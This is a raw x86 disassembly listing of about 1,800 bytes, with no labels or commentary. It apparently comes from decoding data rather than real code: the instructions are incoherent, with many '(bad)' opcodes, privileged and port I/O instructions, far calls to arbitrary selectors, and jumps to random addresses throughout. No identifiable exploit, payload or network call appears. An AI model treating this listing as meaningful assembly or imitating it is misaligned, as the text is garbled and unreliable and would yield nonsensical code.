  47e456:	sbb    al,0x22
  47e458:	jne    0x47e47b
  47e45a:	inc    ebp
  47e45b:	sahf   
  47e45c:	xchg   ebp,eax
  47e45d:	pop    edi
  47e45e:	and    DWORD PTR [ecx-0x7703d3b4],edi
  47e464:	add    DWORD PTR [eax+0x55],edx
  47e467:	sbb    cl,ah
  47e469:	pop    ss
  47e46a:	dec    esi
  47e46b:	ds cld 
  47e46d:	cmp    bh,BYTE PTR [esi]
  47e46f:	scas   eax,DWORD PTR es:[edi]
  47e470:	popf   
  47e471:	pop    eax
  47e472:	cmp    BYTE PTR [ebx],bl
  47e474:	sub    cl,dl
  47e476:	jmp    0x47e4a2
  47e478:	add    eax,0x4280ea2b
  47e47d:	pop    ebx
  47e47e:	sbb    BYTE PTR [edx+ecx*2],cl
  47e481:	out    0x8e,eax
  47e483:	mov    ah,0x77
  47e485:	sbb    ebx,DWORD PTR [edx-0x30]
  47e488:	jmp    0x47e494
  47e48a:	push   ss
  47e48b:	lock fcom DWORD PTR [ebx+0x15]
  47e48f:	nop
  47e490:	and    DWORD PTR [ebx+0x30],edx
  47e493:	les    ebx,FWORD PTR [ebx]
  47e495:	xor    al,0x4c
  47e497:	daa    
  47e498:	adc    edi,edx
  47e49a:	lock sub eax,0x104f6120
  47e4a0:	dec    edx
  47e4a1:	xchg   DWORD PTR [edi],esp
  47e4a3:	sbb    eax,0x2ce423d0
  47e4a8:	dec    ecx
  47e4a9:	add    al,0x17
  47e4ab:	adc    dl,BYTE PTR [ecx+edx*4+0x1a9b0403]
  47e4b2:	in     al,0x2b
  47e4b4:	or     eax,0xebd80452
  47e4b9:	ss xor ebx,ebx
  47e4bc:	es clc 
  47e4be:	sbb    BYTE PTR [esi+0x19],bh
  47e4c1:	aad    0x24
  47e4c3:	dec    ecx
  47e4c4:	lock jge 0x47e4df
  47e4c7:	out    0x34,al
  47e4c9:	cmp    al,0xd3
  47e4cb:	sub    BYTE PTR [ebp+edx*2+0x45],bh
  47e4cf:	or     al,0x82
  47e4d1:	int    0x12
  47e4d3:	xchg   esi,eax
  47e4d4:	mov    ebx,0x9b72f17
  47e4d9:	and    al,0xe4
  47e4db:	adc    BYTE PTR [ebx],ah
  47e4dd:	imul   esi,DWORD PTR [ecx],0xf00f90cc
  47e4e3:	test   DWORD PTR [ebp+0x0],esi
  47e4e6:	rcl    DWORD PTR [ebx-0x4bdb8259],cl
  47e4ec:	sub    eax,0x2919b70d
  47e4f1:	mov    al,0x4e
  47e4f3:	xor    BYTE PTR [eax],cl
  47e4f5:	outs   dx,BYTE PTR ds:[esi]
  47e4f6:	cmp    edi,0x57d2e1d5
  47e4fc:	bound  esi,QWORD PTR [ebp+0x64]
  47e4ff:	mov    WORD PTR [eax-0x7d],fs
  47e502:	sub    BYTE PTR ds:[edx-0x4],dh
  47e506:	cmp    eax,0xdb04fe1f
  47e50b:	push   0x30
  47e50d:	jl     0x47e56b
  47e50f:	lock dec eax
  47e511:	or     eax,DWORD PTR [ecx+0x67]
  47e514:	ins    DWORD PTR es:[edi],dx
  47e515:	xor    eax,0x146d0809
  47e51a:	psubd  mm1,QWORD PTR [edi]
  47e51d:	jb     0x47e52b
  47e51f:	push   0x1
  47e521:	adc    BYTE PTR [esi-0x73],dl
  47e524:	jle    0x47e53a
  47e526:	lea    esi,[ebp-0x10]
  47e529:	dec    eax
  47e52a:	pop    esi
  47e52b:	loopne 0x47e4b0
  47e52d:	jmp    ebx
  47e52f:	mov    DWORD PTR [esi+0x24],0x724c3eff
  47e536:	push   cs
  47e537:	push   0x468d00c4
  47e53c:	sub    BYTE PTR [edx],dh
  47e53e:	xchg   ebx,eax
  47e53f:	inc    eax
  47e540:	imul   ebp,ebx,0x78
  47e543:	aas    
  47e544:	push   0xd31e9f24
  47e549:	daa    
  47e54a:	push   cs
  47e54b:	xor    dl,BYTE PTR ds:0x49b66afc
  47e551:	push   ebx
  47e552:	push   eax
  47e553:	dec    esp
  47e554:	inc    ecx
  47e555:	pop    ecx
  47e556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47e557:	and    eax,0x7952a464
  47e55c:	mov    BYTE PTR [esi],ch
  47e55e:	or     al,0x5
  47e560:	or     al,0x90
  47e562:	pushf  
  47e563:	and    ah,0xc
  47e566:	cwde   
  47e567:	cs dec esp
  47e569:	and    DWORD PTR [edi+0x32],eax
  47e56c:	cmovno esp,DWORD PTR [esi]
  47e56f:	sbb    DWORD PTR [ecx+0x2f5c9e54],ebp
  47e575:	adc    BYTE PTR [esi],al
  47e577:	adc    BYTE PTR [ecx],ah
  47e579:	daa    
  47e57a:	and    BYTE PTR [ecx],bh
  47e57c:	adc    BYTE PTR [edi+ebp*1-0x24],ch
  47e580:	xor    eax,0xd4571321
  47e585:	jge    0x47e5fc
  47e587:	push   esp
  47e588:	sub    bh,BYTE PTR [edi+0x2e27a61c]
  47e58e:	mov    ecx,0x7143090
  47e593:	cmc    
  47e594:	fist   DWORD PTR [esi+0x106b178b]
  47e59a:	add    dl,BYTE PTR [esi-0x497d48fe]
  47e5a0:	adc    al,0xd8
  47e5a2:	pop    ebx
  47e5a3:	adc    BYTE PTR [eax+eax*4-0xe4387e0],ch
  47e5aa:	test   BYTE PTR [esi-0x6f7efb87],dh
  47e5b0:	out    dx,eax
  47e5b1:	mov    DWORD PTR [ebp-0x14],eax
  47e5b4:	or     eax,0x450e95d5
  47e5b9:	repnz gs lahf 
  47e5bc:	push   edi
  47e5bd:	push   ebp
  47e5be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47e5bf:	sbb    eax,0xf818ce21
  47e5c4:	aad    0x1d
  47e5c6:	hlt    
  47e5c7:	dec    ecx
  47e5c8:	test   BYTE PTR [edi+esi*8-0x28],cl
  47e5cc:	cld    
  47e5cd:	into   
  47e5ce:	popf   
  47e5cf:	rcl    esp,cl
  47e5d1:	or     dl,BYTE PTR [ebp+0x185fb05b]
  47e5d7:	mov    al,0xb0
  47e5d9:	adc    al,dh
  47e5db:	and    esi,ecx
  47e5dd:	push   ebx
  47e5de:	ror    BYTE PTR [ebx+0x5736f8bd],0x2b
  47e5e5:	jne    0x47e60b
  47e5e7:	and    edi,DWORD PTR [ecx+0x1b]
  47e5ea:	sbb    dl,BYTE PTR [ebx]
  47e5ec:	xor    DWORD PTR [esi],eax
  47e5ee:	jmp    0x47e61d
  47e5f0:	ds push ss
  47e5f2:	pusha  
  47e5f3:	icebp  
  47e5f4:	sbb    edi,DWORD PTR [esp+eax*1+0x298a1332]
  47e5fb:	push   esi
  47e5fc:	push   0x20418e27
  47e601:	mov    ah,0x16
  47e603:	mov    WORD PTR [ebp+0x10],fs
  47e606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47e607:	jle    0x47e655
  47e609:	add    al,0x5f
  47e60b:	inc    ebp
  47e60c:	outs   dx,BYTE PTR ds:[esi]
  47e60d:	jne    0x47e67c
  47e60f:	xor    BYTE PTR [eax-0x3d],0xc7
  47e613:	imul   BYTE PTR [ecx+eiz*2+0x79]
  47e617:	ja     0x47e68c
  47e619:	loopne 0x47e5bc
  47e61b:	lods   eax,DWORD PTR ds:[esi]
  47e61c:	lea    ebx,[eax-0x5ca0bdcf]
  47e622:	call   0x5c7:0xe67e0d03
  47e629:	stos   DWORD PTR es:[edi],eax
  47e62a:	mov    al,0x7e
  47e62c:	adc    bh,ah
  47e62e:	out    0xd2,eax
  47e630:	lods   al,BYTE PTR ds:[esi]
  47e631:	jl     0x47e5fb
  47e633:	sub    eax,DWORD PTR [eax]
  47e635:	mov    DWORD PTR [eax],edi
  47e637:	add    al,0xf9
  47e639:	pop    esp
  47e63a:	sahf   
  47e63b:	retf   0x2c60
  47e63e:	or     al,bh
  47e640:	or     al,0xcc
  47e642:	sub    eax,0x53e54f17
  47e647:	adc    BYTE PTR [eax-0x778bebd2],ah
  47e64d:	ret    
  47e64e:	shr    DWORD PTR [esi-0x4e],0xf5
  47e652:	push   ebp
  47e653:	push   ebx
  47e654:	inc    ebp
  47e655:	push   edx
  47e656:	xor    al,BYTE PTR [esp+ecx*2+0x4c]
  47e65a:	dec    BYTE PTR [esi-0xe]
  47e65d:	nop
  47e65e:	push   ebx
  47e65f:	pop    ss
  47e660:	xor    eax,0x3c891831
  47e665:	xor    DWORD PTR [esi],ebx
  47e667:	mov    dh,0xdc
  47e669:	inc    edx
  47e66a:	cmp    eax,0x350dae26
  47e66f:	cs mov al,es:0x2c7f7537
  47e676:	push   esi
  47e677:	mov    fs,WORD PTR [eax+eax*2+0x7c]
  47e67b:	sub    al,0xc3
  47e67d:	mov    WORD PTR ds:0x2efd411c,cs
  47e683:	prefetchw BYTE PTR [ecx-0x72]
  47e687:	dec    DWORD PTR [ecx+eiz*8]
  47e68a:	xchg   DWORD PTR [ebp-0x6ca7f491],eax
  47e690:	cld    
  47e691:	mov    al,0xdc
  47e693:	cmp    esp,DWORD PTR [eax]
  47e695:	cld    
  47e696:	push   cs
  47e697:	pop    edi
  47e698:	rcl    DWORD PTR [ecx],cl
  47e69a:	mov    ds:0xad7982b9,eax
  47e69f:	cmp    cl,BYTE PTR [ecx]
  47e6a1:	inc    ebx
  47e6a2:	pop    esp
  47e6a3:	xchg   esp,eax
  47e6a4:	pop    esi
  47e6a5:	xor    al,0x4
  47e6a7:	aas    
  47e6a8:	mov    esi,0xc4dd2c23
  47e6ad:	outs   dx,DWORD PTR ds:[esi]
  47e6ae:	or     eax,DWORD PTR [edi+0x6b]
  47e6b1:	push   ebx
  47e6b2:	shr    dh,cl
  47e6b4:	cmp    DWORD PTR [edx+0x6],eax
  47e6b7:	clc    
  47e6b8:	adc    DWORD PTR [bx+di+0x32],ecx
  47e6bc:	sti    
  47e6bd:	out    dx,al
  47e6be:	rcr    cl,0x33
  47e6c1:	push   esi
  47e6c2:	imul   esp,DWORD PTR [ebp+0x77],0x8164df65
  47e6c9:	iret   
  47e6ca:	retf   
  47e6cb:	adc    DWORD PTR [ecx],ecx
  47e6cd:	xor    al,0x32
  47e6cf:	adc    ecx,DWORD PTR [ecx-0x15]
  47e6d2:	nop
  47e6d3:	xor    BYTE PTR [eax+0x7b645ab8],dl
  47e6d9:	jae    0x47e65f
  47e6db:	xor    al,0x4f
  47e6dd:	hlt    
  47e6de:	xor    DWORD PTR [edx+0x66],eax
  47e6e1:	add    al,0x95
  47e6e3:	mov    ah,0x4c
  47e6e5:	fnsave [eax+0x77]
  47e6e8:	adc    eax,0xe4699c08
  47e6ed:	mov    ah,0x27
  47e6ef:	and    DWORD PTR [ecx-0x5a],0x1d32307b
  47e6f6:	push   esp
  47e6f7:	mov    esi,0xb0f70183
  47e6fc:	or     al,0xd7
  47e6fe:	or     al,0xb4
  47e700:	inc    ecx
  47e701:	dec    edx
  47e702:	mov    ds:0x37036d64,eax
  47e707:	dec    eax
  47e708:	jbe    0x47e6ed
  47e70a:	dec    esi
  47e70b:	xor    BYTE PTR [ebx],dh
  47e70d:	ds jo  0x47e718
  47e710:	sub    cl,BYTE PTR [ecx]
  47e712:	mov    edi,0x3854514
  47e717:	push   es
  47e718:	rcl    ch,cl
  47e71a:	and    esp,edi
  47e71c:	push   0x94c6e4b7
  47e721:	push   ss
  47e722:	(bad)  
  47e723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47e724:	pop    ds
  47e725:	lds    esp,FWORD PTR ds:0x31f41703
  47e72b:	inc    edx
  47e72c:	popa   
  47e72d:	sbb    al,ah
  47e72f:	cmp    dl,BYTE PTR [edx+0x49df4e55]
  47e735:	dec    ecx
  47e736:	or     al,bl
  47e738:	das    
  47e739:	add    dh,BYTE PTR [eax]
  47e73b:	cmp    al,0xf
  47e73d:	xchg   esi,eax
  47e73e:	dec    esi
  47e73f:	outs   dx,BYTE PTR ds:[esi]
  47e740:	cmovo  edx,DWORD PTR [esp+eax*2-0x28]
  47e745:	imul   eax,DWORD PTR [edi-0x7fecd934],0x39d44a94
  47e74f:	cmp    DWORD PTR [edx-0xa],esi
  47e752:	sub    ecx,DWORD PTR [edi+ecx*1]
  47e755:	sub    eax,0x3c342e20
  47e75a:	pop    es
  47e75b:	or     al,0x9c
  47e75d:	sbb    al,0x2f
  47e75f:	cmp    BYTE PTR [ebx+ebp*1+0x44e0ef3c],dl
  47e766:	int3   
  47e767:	shr    DWORD PTR [ebx+ebx*8+0x79b9e506],1
  47e76e:	call   0x341f:0xc9c1f3cf
  47e775:	sub    DWORD PTR [ebx],esi
  47e777:	imul   edi,DWORD PTR [esi],0x33eff34f
  47e77d:	idiv   edi
  47e77f:	pop    es
  47e780:	xor    al,0xf
  47e782:	test   al,0x58
  47e784:	push   ebx
  47e785:	out    0x17,eax
  47e787:	in     al,dx
  47e788:	ja     0x47e762
  47e78a:	popf   
  47e78b:	xchg   esp,eax
  47e78c:	outs   dx,BYTE PTR ds:[esi]
  47e78d:	aas    
  47e78e:	cs loope 0x47e7e4
  47e791:	aaa    
  47e792:	jb     0x47e78f
  47e794:	in     al,0xb9
  47e796:	push   edi
  47e797:	sub    al,0x90
  47e799:	add    al,0x35
  47e79b:	sbb    BYTE PTR [ebx+0x34],bh
  47e79e:	inc    edx
  47e79f:	or     al,0xdc
  47e7a1:	rcr    ah,1
  47e7a3:	pop    ss
  47e7a4:	add    DWORD PTR [esi],ebx
  47e7a6:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  47e7a8:	icebp  
  47e7a9:	push   ebp
  47e7aa:	pop    es
  47e7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47e7ac:	in     al,0x40
  47e7ae:	inc    edx
  47e7af:	mov    cl,0x19
  47e7b1:	stc    
  47e7b2:	test   eax,0x4231889f
  47e7b7:	add    BYTE PTR [esp],cl
  47e7ba:	or     al,0x54
  47e7bc:	xchg   ecx,eax
  47e7bd:	arpl   WORD PTR [ecx],cx
  47e7bf:	xlat   BYTE PTR ds:[ebx]
  47e7c0:	fst    DWORD PTR [eax+0x3ac133c6]
  47e7c6:	daa    
  47e7c7:	mov    bh,0x34
  47e7c9:	sysexit 
  47e7cb:	ss jecxz 0x47e763
  47e7ce:	push   esp
  47e7cf:	pop    edx
  47e7d0:	xchg   eax,edi
  47e7d2:	clc    
  47e7d3:	ret    0x5235
  47e7d6:	or     ebx,DWORD PTR [edx+ebp*2]
  47e7d9:	(bad)  
  47e7da:	cmp    eax,0x1411e534
  47e7df:	in     al,0xae
  47e7e1:	in     al,dx
  47e7e2:	outs   dx,BYTE PTR ds:[esi]
  47e7e3:	mov    eax,0xa3602634
  47e7e8:	daa    
  47e7e9:	dec    ebx
  47e7ea:	add    edi,ebx
  47e7ec:	cmc    
  47e7ed:	adc    eax,0xd42712a1
  47e7f2:	setae  ah
  47e7f5:	add    BYTE PTR [eax-0x363bb58e],al
  47e7fb:	sbb    bl,BYTE PTR ds:0x97907092
  47e801:	ret    0xb485
  47e804:	fwait
  47e805:	shrd   DWORD PTR ds:0xa63b1481,edi,cl
  47e80c:	add    ecx,edi
  47e80e:	pusha  
  47e80f:	ja     0x47e810
  47e811:	inc    ecx
  47e812:	ror    DWORD PTR [edi],0x19
  47e815:	clc    
  47e816:	mov    ecx,0x9e3a3618
  47e81b:	sbb    DWORD PTR [ebx+0x32],0x40
  47e81f:	jbe    0x47e805
  47e821:	stc    
  47e822:	mov    al,ds:0xaf520218
  47e827:	push   eax
  47e828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47e829:	inc    eax
  47e82a:	jb     0x47e876
  47e82c:	les    esi,FWORD PTR [edi]
  47e82e:	xor    DWORD PTR [ebx],edx
  47e830:	ds js  0x47e81f
  47e833:	and    eax,0xd818172f
  47e838:	sbb    eax,0x32120068
  47e83d:	adc    al,0xea
  47e83f:	and    al,0x34
  47e841:	leave  
  47e842:	jmp    0x470f4625
  47e847:	sbb    al,0x39
  47e849:	call   eax
  47e84b:	adc    al,0x92
  47e84d:	or     bh,bl
  47e84f:	push   edi
  47e850:	or     al,0xb5
  47e852:	scas   al,BYTE PTR es:[edi]
  47e853:	enter  0x3723,0x61
  47e857:	iret   
  47e858:	adc    eax,0x263e440c
  47e85d:	dec    eax
  47e85e:	xor    edx,DWORD PTR [esi-0x14d3956d]
  47e864:	inc    ebx
  47e865:	sbb    al,0xb7
  47e867:	adc    BYTE PTR [esp+ecx*1-0x3119117b],dh
  47e86e:	in     eax,0x68
  47e870:	mov    cl,0x7
  47e872:	sub    cl,BYTE PTR [esi+ebx*1]
  47e875:	loope  0x47e850
  47e877:	ret    0xa81c
  47e87a:	lods   eax,DWORD PTR ds:[esi]
  47e87b:	je     0x47e7ff
  47e87d:	pop    ecx
  47e87e:	lds    esp,FWORD PTR [eax]
  47e880:	pop    ss
  47e881:	xchg   esi,eax
  47e882:	sub    BYTE PTR fs:[ecx],0x5e
  47e886:	(bad)  
  47e887:	adc    al,0x7a
  47e889:	cdq    
  47e88a:	inc    eax
  47e88b:	mov    ss,WORD PTR [eax+0x5018f4f4]
  47e891:	jl     0x47e85e
  47e893:	jmp    DWORD PTR es:[esi+esi*1]
  47e897:	rcl    DWORD PTR [ebx+0x76],cl
  47e89a:	sub    esi,DWORD PTR ds:0xdf37e8e4
  47e8a0:	and    al,bh
  47e8a2:	push   ebp
  47e8a3:	mov    ch,0x11
  47e8a6:	sub    eax,0x2374f9e8
  47e8ab:	push   edx
  47e8ac:	lds    esp,FWORD PTR [esi-0x61]
  47e8af:	inc    esi
  47e8b0:	adc    cl,BYTE PTR [ebx-0x16affe29]
  47e8b6:	lods   eax,DWORD PTR ds:[esi]
  47e8b7:	jb     0x47e885
  47e8b9:	push   esp
  47e8ba:	sbb    BYTE PTR [ebx],dl
  47e8bc:	mov    BYTE PTR [esi],cl
  47e8be:	jecxz  0x47e8b9
  47e8c0:	or     al,0x7e
  47e8c2:	push   es
  47e8c3:	int3   
  47e8c4:	push   cs
  47e8c5:	into   
  47e8c6:	popa   
  47e8c7:	jg     0x47e8ad
  47e8c9:	pop    ss
  47e8ca:	and    dl,BYTE PTR [edi+0x2c01180f]
  47e8d0:	add    BYTE PTR [ecx-0x6bd9ab61],dh
  47e8d6:	je     0x47e87a
  47e8d8:	adc    BYTE PTR [ebx],dl
  47e8da:	sbb    DWORD PTR [eax],edx
  47e8dc:	sub    BYTE PTR [eax+0x2897cd70],al
  47e8e2:	or     al,0xea
  47e8e4:	xchg   edi,eax
  47e8e5:	nop
  47e8e6:	scas   al,BYTE PTR es:[edi]
  47e8e7:	push   ebx
  47e8e8:	(bad)  
  47e8ea:	mov    eax,ds:0x8a721b4d
  47e8ef:	lock pop ss
  47e8f1:	cli    
  47e8f2:	cmp    esi,esp
  47e8f4:	add    DWORD PTR [ecx],0xffffffe1
  47e8f7:	ror    BYTE PTR [esi-0x3fcf8a3c],0x83
  47e8fe:	sbb    BYTE PTR [ebx+edx*1+0x2642981b],al
  47e905:	cmp    eax,0xb31c3316
  47e90a:	xor    eax,0x293c00f0
  47e90f:	loopne 0x47e920
  47e911:	test   ah,dl
  47e913:	jbe    0x47e935
  47e915:	cmp    eax,DWORD PTR [ecx]
  47e917:	dec    esp
  47e918:	xor    BYTE PTR [edx],ah
  47e91a:	xchg   ebp,eax
  47e91b:	mov    edi,0x907a115c
  47e920:	xchg   edx,eax
  47e921:	inc    eax
  47e922:	or     BYTE PTR [edx+0x44],bl
  47e925:	xchg   ebp,eax
  47e926:	popf   
  47e927:	cs shl ah,cl
  47e92a:	sub    bh,BYTE PTR [ecx+ebp*4+0xdb5246b]
  47e931:	loopne 0x47e914
  47e933:	jl     0x47e98a
  47e935:	sbb    eax,0xd0c9cf59
  47e93a:	test   eax,0x2b74ce14
  47e93f:	inc    edx
  47e940:	xor    edi,DWORD PTR ds:0x75f4153c
  47e946:	(bad)  
  47e947:	mov    ebp,0x2314efb3
  47e94c:	dec    eax
  47e94d:	jle    0x47e97d
  47e94f:	adc    eax,0x909d9092
  47e954:	dec    ecx
  47e955:	pop    ds
  47e956:	les    ebx,FWORD PTR [edx+0x7b]
  47e959:	adc    BYTE PTR [ebx+0x8],al
  47e95c:	mov    es,WORD PTR [ebx-0x259ce747]
  47e962:	adc    al,0xd4
  47e964:	bound  esp,QWORD PTR [ebx]
  47e966:	in     al,dx
  47e967:	daa    
  47e968:	add    edi,DWORD PTR [ecx-0x7a]
  47e96b:	nop
  47e96c:	cmp    al,0xe4
  47e96e:	cmp    DWORD PTR [edx+0x2d],eax
  47e971:	add    BYTE PTR [esi+0x29],bh
  47e974:	jmp    0x47e9c9
  47e976:	ret    
  47e977:	sub    esi,DWORD PTR [esp+edx*1+0x25]
  47e97b:	jmp    0x47e993
  47e97d:	mov    ecx,0x53b92b2c
  47e982:	les    esi,FWORD PTR [edx]
  47e984:	push   esi
  47e985:	in     al,0x32
  47e987:	inc    edx
  47e988:	imul   eax,ecx,0x3a01e82c
  47e98e:	inc    edx
  47e98f:	daa    
  47e990:	or     eax,0x5fb729a3
  47e995:	add    ebx,DWORD PTR [ecx-0x37cffb08]
  47e99b:	das    
  47e99c:	xchg   edx,eax
  47e99d:	in     eax,dx
  47e99e:	cmp    bl,bl
  47e9a0:	inc    ebp
  47e9a1:	adc    dl,BYTE PTR [eax-0x4b]
  47e9a4:	adc    dh,ah
  47e9a6:	and    al,0x97
  47e9a8:	sbb    DWORD PTR [ebp-0x4bb83e01],0x7ec08508
  47e9b2:	jg     0x47e9fc
  47e9b4:	jne    0x47e9f5
  47e9b6:	sbb    al,0x1b
  47e9b8:	add    cl,BYTE PTR [ebx+0x2f]
  47e9bb:	cmp    dl,BYTE PTR [eax+0x4]
  47e9be:	or     esp,eax
  47e9c0:	retw   
  47e9c2:	xchg   ebx,eax
  47e9c3:	inc    ebp
  47e9c4:	xchg   cl,dl
  47e9c6:	cmp    ah,BYTE PTR [eax]
  47e9c8:	je     0x47e9ca
  47e9ca:	cmp    eax,DWORD PTR [esi+0xa013d94]
  47e9d0:	into   
  47e9d1:	and    cl,BYTE PTR [edi-0x7b]
  47e9d4:	or     al,0xb5
  47e9d6:	mov    ds:0x7d3d0e40,eax
  47e9db:	lock xchg ecx,eax
  47e9dd:	and    ecx,DWORD PTR [eax]
  47e9df:	enter  0xbff0,0xf4
  47e9e3:	rol    edx,0xa0
  47e9e6:	add    BYTE PTR [edx+0x71aafe6c],dh
  47e9ec:	xor    DWORD PTR [ebp+0x27243eb9],edi
  47e9f2:	fst    QWORD PTR [ebp-0x64]
  47e9f5:	es inc esi
  47e9f7:	push   ebx
  47e9f8:	das    
  47e9f9:	pop    edi
  47e9fa:	xor    BYTE PTR [esi+0x1],bh
  47e9fd:	arpl   WORD PTR [ebx-0x20],dx
  47ea00:	mov    ebx,ecx
  47ea02:	aad    0x92
  47ea04:	(bad)  
  47ea05:	jp     0x47e9c0
  47ea07:	stos   BYTE PTR es:[edi],al
  47ea08:	adc    eax,0xfad8003d
  47ea0d:	mov    ah,0x0
  47ea0f:	inc    esp
  47ea10:	or     eax,0xc1a44096
  47ea15:	jae    0x47ea3d
  47ea17:	rol    DWORD PTR [edx],cl
  47ea19:	ret    
  47ea1a:	ins    BYTE PTR es:[edi],dx
  47ea1b:	push   ss
  47ea1c:	cmp    al,0xd9
  47ea1e:	cwde   
  47ea1f:	mov    ss,WORD PTR [edi+0x40f9de9a]
  47ea25:	daa    
  47ea26:	daa    
  47ea27:	xor    eax,0x7c3c2d43
  47ea2c:	fsubr  DWORD PTR [ecx+ebx*2+0x206a0480]
  47ea33:	sahf   
  47ea34:	or     ch,dl
  47ea36:	inc    edi
  47ea37:	pop    eax
  47ea38:	fsub   QWORD PTR [ebx+ebp*1]
  47ea3b:	and    BYTE PTR [esi],ah
  47ea3d:	jbe    0x47ea52
  47ea3f:	xlat   BYTE PTR ds:[ebx]
  47ea40:	fadd   QWORD PTR [ecx]
  47ea42:	xlat   BYTE PTR ds:[ebx]
  47ea43:	test   al,0x30
  47ea45:	push   es
  47ea46:	push   es
  47ea47:	or     al,0x6a
  47ea49:	jmp    0x4e788cb3
  47ea4e:	mov    cl,0x44
  47ea50:	cmp    edi,0xfffffff0
  47ea53:	bound  esp,QWORD PTR [edx-0x50e69953]
  47ea59:	push   eax
  47ea5a:	mov    cl,0x20
  47ea5c:	dec    edi
  47ea5d:	stos   BYTE PTR es:[edi],al
  47ea5e:	ins    DWORD PTR es:[edi],dx
  47ea5f:	push   0x115025a
  47ea64:	xor    ebp,esp
  47ea66:	pop    ebp
  47ea67:	ins    DWORD PTR es:[edi],dx
  47ea68:	jp     0x47eabd
  47ea6a:	mov    eax,ds:0xdf2f7e60
  47ea6f:	in     al,0x18
  47ea71:	pop    es
  47ea72:	fwait
  47ea73:	or     BYTE PTR [ebx],bh
  47ea75:	push   ebp
  47ea76:	and    edx,DWORD PTR [esi+eiz*2]
  47ea79:	mov    BYTE PTR [ecx],cl
  47ea7b:	jge    0x47eac0
  47ea7d:	jmp    FWORD PTR [edi]
  47ea7f:	stos   BYTE PTR es:[edi],al
  47ea80:	or     al,0x37
  47ea82:	mov    eax,ds:0xe8d0a1dc
  47ea87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47ea88:	fnstenv [edx]
  47ea8a:	adc    BYTE PTR [ebx],dh
  47ea8c:	sbb    cl,BYTE PTR [ebp-0x1c]
  47ea8f:	in     al,dx
  47ea90:	ret    0x9a09
  47ea93:	daa    
  47ea94:	js     0x47ea8a
  47ea96:	fadd   st(4),st
  47ea98:	cmp    bh,BYTE PTR [ebp+0x47cabb84]
  47ea9e:	test   esp,esi
  47eaa0:	xor    eax,0x6c1de945
  47eaa5:	jb     0x47eaf0
  47eaa7:	lea    ebx,ds:0xa19cec76
  47eaad:	repnz dec ebp
  47eaaf:	ror    BYTE PTR [edx+ecx*2],cl
  47eab2:	mov    eax,0x6bc61f41
  47eab7:	lahf   
  47eab8:	outs   dx,DWORD PTR ds:[esi]
  47eab9:	lock (bad) 
  47eabb:	loopne 0x47eada
  47eabd:	fbstp  TBYTE PTR ds:0x468397a7
  47eac3:	(bad)  
  47eac5:	jmp    0x47eaeb
  47eac7:	mov    ebx,0xadde264b
  47eacc:	in     al,0x33
  47eace:	shl    BYTE PTR [ebx+edi*8],cl
  47ead1:	xor    dl,dl
  47ead3:	cmp    al,0x1c
  47ead5:	stos   DWORD PTR es:[edi],eax
  47ead6:	sbb    al,0x3d
  47ead8:	inc    edx
  47ead9:	shl    al,1
  47eadb:	repnz arpl WORD PTR [edx-0x80],sp
  47eadf:	ja     0x47ea71
  47eae1:	daa    
  47eae2:	call   0x76e1efa8
  47eae7:	call   0xd138d6f0
  47eaec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47eaed:	mov    eax,ds:0x3e2107b1
  47eaf2:	(bad)  
  47eaf3:	xchg   edi,eax
  47eaf4:	or     bh,al
  47eaf6:	mov    eax,ds:0x31fb14e
  47eafb:	push   esp
  47eafc:	push   DWORD PTR [ecx+0x75191446]
  47eb02:	sbb    BYTE PTR [ecx+0x77eb353c],bh
  47eb08:	fdiv   DWORD PTR [eax-0x72]
  47eb0b:	ins    DWORD PTR es:[edi],dx
  47eb0c:	inc    ecx
  47eb0d:	inc    bx
  47eb0f:	test   DWORD PTR [esi+0x66],edi
  47eb12:	dec    ebp
  47eb13:	shl    DWORD PTR [edx],cl
  47eb15:	dec    ebp
  47eb16:	adc    esi,eax
  47eb18:	add    ah,ch
  47eb1a:	lock nop
  47eb1c:	adc    DWORD PTR [edx],edi
  47eb1e:	in     al,0xb9
  47eb20:	sub    BYTE PTR [esi],bh
  47eb22:	in     al,dx
  47eb23:	or     DWORD PTR [eax-0x4b16d20a],edx
  47eb29:	cld    
  47eb2a:	and    BYTE PTR [edx-0x18],al
  47eb2d:	mov    esp,0xe8b93420
  47eb32:	sub    bl,0x6
  47eb35:	retf   0x6a63
  47eb38:	cmp    ah,bh
  47eb3a:	loopne 0x47eade
  47eb3c:	push   ebx
  47eb3d:	push   ds
  47eb3e:	ds jne 0x47eb21
  47eb41:	inc    edx
  47eb42:	call   0xa41d:0x7bf030e8
  47eb49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47eb4a:	leave  
  47eb4b:	fisttp QWORD PTR [edi+0x42]
  47eb4e:	sub    BYTE PTR [eax+0x71],dh
  47eb51:	lea    esp,[eax]
  47eb53:	scas   al,BYTE PTR es:[edi]
  47eb54:	outs   dx,DWORD PTR ds:[esi]
  47eb55:	fldenv [ecx-0x76]
  47eb58:	mov    eax,ds:0x3f1b29c7
  47eb5d:	mov    cl,0xa
  47eb5f:	pop    es
  47eb60:	enter  0xd0d0,0x25
  47eb64:	shl    DWORD PTR [ebx],cl
  47eb66:	inc    esp
  47eb67:	pop    edi
  47eb68:	xchg   BYTE PTR [edi+0x4a],ah
  47eb6b:	and    ebx,DWORD PTR [eax-0x6c]
  47eb6e:	xlat   BYTE PTR ds:[ebx]
  47eb6f:	pop    ss
  47eb70:	and    eax,0xf80e4d7f
  47eb75:	xchg   edi,eax
  47eb76:	sub    al,0x3f
  47eb78:	dec    eax
  47eb79:	jnp    0x47eb73
  47eb7b:	sub    bh,0x30
  47eb7e:	adc    BYTE PTR ds:0x4d88f03c,bl
  47eb84:	popf   
  47eb85:	pop    esp
  47eb86:	lock xor al,0xc8
  47eb89:	and    eax,0x6348795
  47eb8e:	stos   DWORD PTR es:[edi],eax
  47eb8f:	and    bh,BYTE PTR [edi]
  47eb91:	lock inc ebx
  47eb93:	push   0x1
  47eb95:	xor    bh,al
  47eb97:	lahf   
  47eb98:	xor    BYTE PTR [eax-0x262e76b8],al
  47eb9e:	pop    ebp
  47eb9f:	adc    bl,BYTE PTR [edx]
